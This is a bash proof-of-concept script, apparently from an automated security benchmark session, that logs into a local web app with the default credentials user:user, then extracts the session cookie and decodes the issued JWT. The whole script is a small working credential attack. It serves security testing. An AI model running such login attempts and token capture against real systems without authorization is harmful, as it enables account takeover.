#!/bin/bash
# POC: Demonstrates weak password policy vulnerability by successfully authenticating with default credentials (user:user) and verifying weak password acceptance
# Target: ./repo
# Created: 2025-11-07T18:15:06.209Z
# Session: benchmark-XBEN-091-24-mhp5xfb5

# Weak Password Policy POC - Default Credentials (user:user)
# This script demonstrates that the application accepts weak/default credentials
# and does not enforce strong password requirements

TARGET="http://localhost:5003"
LOGIN_ENDPOINT="/login"

echo "================================================"
echo "Weak Password Policy POC - Default Credentials"
echo "================================================"
echo ""

# Test 1: Login with default credentials (user:user)
echo "[*] Test 1: Attempting login with default credentials (user:user)..."
RESPONSE=$(curl -s -i -X POST "${TARGET}${LOGIN_ENDPOINT}" \
  -d "username=user&password=user" \
  -H "Content-Type: application/x-www-form-urlencoded")

echo "$RESPONSE" | head -20
echo ""

# Extract status code
STATUS_CODE=$(echo "$RESPONSE" | head -1 | awk '{print $2}')
echo "[*] HTTP Status Code: $STATUS_CODE"
echo ""

# Extract cookie
COOKIE=$(echo "$RESPONSE" | grep -i "Set-Cookie:" | head -1 | cut -d' ' -f2-)
echo "[*] Authentication Cookie: $COOKIE"
echo ""

# Check if login was successful (302 redirect or 200 with token)
if echo "$RESPONSE" | grep -qi "Set-Cookie.*token"; then
  echo "[✓] SUCCESS: Application accepted weak credentials (user:user)"
  echo "[✓] This indicates:"
  echo "    - No strong password policy is enforced"
  echo "    - Default user account with weak password exists"
  echo "    - Password matches username (trivially guessable)"
  echo ""
  
  # Extract and decode the JWT token
  TOKEN=$(echo "$RESPONSE" | grep -i "Set-Cookie:" | head -1 | grep -o "token=[^;]*" | cut -d'=' -f2)
  echo "[*] JWT Token Issued: $TOKEN"
  echo ""
  
  # Decode JWT payload (base64 decode)
  if command -v jq &> /dev/null; then
    PAYLOAD=$(echo "$TOKEN" | cut -d'.' -f2)
    # Add padding if needed
    PADDING=$((4 - ${#PAYLOAD} % 4))
    if [ $PADDING -ne 4 ]; then
      PAYLOAD="${PAYLOAD}$(printf '=%.0s' $(seq 1 $PADDING))"
    fi
    DECODED=$(echo "$PAYLOAD" | base64 -d 2>/dev/null)
    echo "[*] JWT Payload (decoded): $DECODED"
    echo ""
  fi
  
  exit 0
else
  echo "[✗] FAILED: Login was not successful"
  echo "Full Response:"
  echo "$RESPONSE"
  exit 1
fi